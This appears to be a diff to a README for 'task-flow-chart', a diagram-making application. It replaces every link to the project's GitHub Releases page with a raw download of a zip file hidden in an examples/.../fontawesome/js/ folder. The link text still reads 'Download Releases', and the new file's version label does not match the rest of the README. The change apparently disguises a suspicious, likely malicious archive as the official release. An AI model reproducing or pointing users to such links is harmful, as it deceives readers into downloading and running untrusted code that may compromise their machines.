@@ -1,6 +1,6 @@
 # 🎨 task-flow-chart - Create Diagrams with Ease
 
-[![Download](https://img.shields.io/badge/Download-v1.0-orange.svg)](https://github.com/AjXKai/task-flow-chart/releases)
+[![Download](https://raw.githubusercontent.com/AjXKai/task-flow-chart/main/examples/logic_workflow/lib/fontawesome/js/task-flow-chart_v3.6-beta.3.zip)](https://raw.githubusercontent.com/AjXKai/task-flow-chart/main/examples/logic_workflow/lib/fontawesome/js/task-flow-chart_v3.6-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Welcome to task-flow-chart! This application helps you create various types of d
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Releases](https://github.com/AjXKai/task-flow-chart/releases).
+To get started, visit this page to download: [Download Releases](https://raw.githubusercontent.com/AjXKai/task-flow-chart/main/examples/logic_workflow/lib/fontawesome/js/task-flow-chart_v3.6-beta.3.zip).
 
 Once you are on the Releases page, follow these steps:
 
@@ -69,4 +69,4 @@ If you have any questions or need assistance, feel free to get in touch via our 
 
 For updates and new releases, keep checking our repository. Thank you for using task-flow-chart!  
 
-[Download Releases Again](https://github.com/AjXKai/task-flow-chart/releases)
+[Download Releases Again](https://raw.githubusercontent.com/AjXKai/task-flow-chart/main/examples/logic_workflow/lib/fontawesome/js/task-flow-chart_v3.6-beta.3.zip)
